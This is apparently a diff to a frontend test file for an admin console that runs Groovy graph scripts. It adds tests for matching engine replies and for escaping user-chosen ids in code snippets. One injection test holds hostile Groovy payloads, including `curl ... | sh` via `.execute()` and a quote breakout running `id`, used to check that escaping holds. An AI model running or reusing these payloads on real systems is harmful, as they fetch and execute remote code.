@@ -17,7 +17,7 @@ vi.mock('@/store/admin', async () => {
     engine: 'ready',
     output: [] as any[],
   })
-  const push = (kind: string, text: string) => { admin.output.push({ id: ++seq, kind, text, at: Date.now() }) }
+  const push = (kind: string, text: string, source?: string) => { admin.output.push({ id: ++seq, kind, text, source, at: Date.now() }) }
   const actions = {
     runScript: vi.fn((script: string) => push('input', script)),
     runStep: vi.fn(),
@@ -58,7 +58,7 @@ import ConsolePage from '../src/pages/console/ConsolePage.vue'
 
 const admin = store.admin as any
 const actions = store.actions as any
-const push = (store as any).__push as (kind: string, text: string) => void
+const push = (store as any).__push as (kind: string, text: string, source?: string) => void
 
 beforeEach(() => {
   __resetReplies()
@@ -83,6 +83,25 @@ describe('engine replies', () => {
     // nothing that came before the script was sent
     expect(matchReply(waiting, { id: 9, kind: 'error', text: 'Caught error: old' })).toBe(-1)
     expect(matchReply(waiting, { id: 13, kind: 'info', text: 'x' })).toBe(-1)
+  })
+
+  it('never takes the refusal of another request as the answer', () => {
+    const waiting = [{ script: 'a()', afterId: 10 }]
+    for (const source of ['LaunchGame', 'DeleteInstance', 'SelectExperiment', 'OnJoinStep', 'OnLeaveStep']) {
+      expect(matchReply(waiting, { id: 12, kind: 'error', text: 'Caught error: not mine', source })).toBe(-1)
+    }
+    // a refused SendScript, or a RunStep (which the server names SendStep), is still an answer
+    expect(matchReply(waiting, { id: 12, kind: 'error', text: 'You are not signed in.', source: 'SendScript' })).toBe(0)
+    expect(matchReply(waiting, { id: 12, kind: 'error', text: 'Something went wrong', source: 'SendStep' })).toBe(0)
+  })
+
+  it('waits past an unrelated error for its own answer', async () => {
+    push('input', 'g.V.count()')
+    const p = expectReply('g.V.count()', lastOutputId())
+    push('error', 'Could not delete the session.', 'DeleteInstance')
+    push('output', 'g.V.count()\n\n==>7')
+    await nextTick()
+    expect(await p).toMatchObject({ ok: true, values: ['7'], error: null })
   })
 
   it('resolves with the answer as it arrives in the output', async () => {
@@ -214,7 +233,40 @@ describe('snippets', () => {
     expect(pickIds(['_1', '3', '8'])).toEqual(['3', '8'])
     expect(pickIds(['_1'])).toEqual(['_1', '2'])
     expect(pickIds([])).toEqual(['1', '2'])
-    expect(fillSnippet('edgeEdits.adminEdit("add", "{p1}", "{p2}")', ['3', 'a"b'])).toBe('edgeEdits.adminEdit("add", "3", "a\\"b")')
+    expect(fillSnippet('edgeEdits.adminEdit("add", {p1}, {p2})', ['3', 'a"b'])).toBe('edgeEdits.adminEdit("add", \'3\', \'a"b\')')
+  })
+
+  // Splits Groovy source into the text outside single-quoted strings and the decoded strings.
+  function lexSingleQuoted (src: string) {
+    let outside = ''
+    const literals: string[] = []
+    const escapes: Record<string, string> = { n: '\n', r: '\r', '\\': '\\', "'": "'" }
+    for (let i = 0; i < src.length; i++) {
+      if (src[i] !== "'") { outside += src[i]; continue }
+      let lit = ''
+      for (i++; i < src.length && src[i] !== "'"; i++) {
+        if (src[i] === '\n' || src[i] === '\r') throw new Error('raw line break inside a string')
+        if (src[i] === '\\') { i++; lit += escapes[src[i]] ?? (() => { throw new Error('unknown escape \\' + src[i]) })() } else lit += src[i]
+      }
+      if (i >= src.length) throw new Error('unterminated string')
+      literals.push(lit)
+    }
+    return { outside, literals }
+  }
+
+  it('puts participant-chosen ids in single-quoted strings, so ${…} never runs', () => {
+    const evil = `\${'curl -s http://x/y.sh|sh'.execute()}'"\\\n\r{p2}$x`
+    const other = `'+\${'id'.execute()}+'`
+    for (const s of SNIPPETS.filter(s => s.code.includes('{p1}'))) {
+      expect(s.code).not.toMatch(/"\{p[12]\}"/)
+      const out = fillSnippet(s.code, [evil, other])
+      const { outside, literals } = lexSingleQuoted(out)
+      expect(outside).not.toContain('${')
+      expect(outside).not.toContain('execute')
+      expect(literals).toContain(evil)
+      if (s.code.includes('{p2}')) expect(literals).toContain(other)
+    }
+    expect(fillSnippet('g.getVertex({p1}).map()', [`\${'x'.execute()}`, '2'])).toBe(`g.getVertex('\${\\'x\\'.execute()}').map()`)
   })
 
   it('searches titles, explanations and code', () => {
